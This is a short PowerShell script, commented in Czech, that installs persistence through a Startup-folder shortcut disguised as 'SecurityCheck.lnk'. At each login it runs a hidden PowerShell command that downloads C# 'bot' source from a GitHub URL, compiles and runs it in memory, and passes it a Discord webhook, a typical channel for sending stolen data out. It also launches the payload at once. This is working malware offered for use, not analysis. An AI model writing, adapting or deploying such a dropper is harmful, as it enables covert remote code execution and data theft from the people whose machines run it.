$webhook = "https://discord.com/api/webhooks/1491728198092849215/DkCsPFapma_HMcUuG5GBIt6B9f55h99touvLjLOxvyLijuaTuZT15NO-xzYrJ78S2d2o"
$github = "https://raw.githubusercontent.com/jfheifohfai/diwidwidid/refs/heads/main/bot.cs"
$shortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SecurityCheck.lnk"

# Příkaz, který Pico/PowerShell spustí
$target = "powershell.exe"
$arg = "-WindowStyle Hidden -Command `"`$w='$webhook'; `$g='$github'; `$c=(iwr -UseBasicParsing `$g).Content; Add-Type -TypeDefinition `$c -ReferencedAssemblies 'System.Management','System.Net.Http','System.Drawing','System.Windows.Forms','System.IO'; [Program]::Main(`$w)`""

# Vytvoření zástupce (LNK) pomocí COM objektu
$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut($shortcutPath)
$shortcut.TargetPath = $target
$shortcut.Arguments = $arg
$shortcut.WindowStyle = 7  # 7 znamená 'Minimalizované'
$shortcut.Save()

# Spustit hned teď pro test
Start-Process powershell.exe -ArgumentList $arg -WindowStyle Hidden
